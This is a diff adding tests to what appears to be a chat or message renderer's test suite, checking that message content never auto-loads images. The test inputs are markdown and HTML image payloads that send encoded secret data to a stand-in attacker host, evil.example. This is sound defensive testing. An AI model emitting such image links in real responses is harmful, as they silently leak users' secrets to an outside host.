@@ -216,3 +216,15 @@ describe("document-name links survive real filenames (the bracket bug)", () => {
     expect(screen.queryByRole("link")).not.toBeInTheDocument();
   });
 });
+
+describe("renderMessageContent: never auto-loads an image (zero-click exfiltration)", () => {
+  it.each([
+    "![x](https://evil.example/p?d=U0VDUkVUX0tFWV9hYmNkZWYxMjM0NTY3ODkw)",
+    'Summary <img src="https://evil.example/p.gif?d=U0VDUkVU">',
+    "![](https://evil.example/i.png) and ![alt](/local.png)",
+  ])("emits no <img> for %s", (content) => {
+    const { container } = render(<Wrap content={content} />);
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.querySelector("[style*='url(']")).toBeNull();
+  });
+});
